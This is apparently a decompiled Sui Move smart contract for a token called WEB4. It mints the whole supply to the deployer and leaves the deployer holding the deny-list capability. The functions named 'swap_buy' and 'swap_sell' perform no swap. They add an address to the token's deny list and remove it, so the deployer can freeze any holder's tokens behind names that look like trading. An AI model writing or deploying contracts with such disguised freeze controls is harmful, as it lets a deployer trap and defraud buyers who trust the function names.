module 0x97cc834c45d6efcd0b9ac1d6e5f3b5b3d0333ed1bb13a2263f24d0d421955f20::web4 {
    struct WEB4 has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: WEB4, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<WEB4>(arg0, 9, b"WEB4", b"WE ARE AGI", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qma93241uCUtmZ5kdXsrS5PVguhA6noWmhSaSMCortpJ9a"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<WEB4>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<WEB4>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<WEB4>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<WEB4>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WEB4>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<WEB4>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WEB4>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<WEB4>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

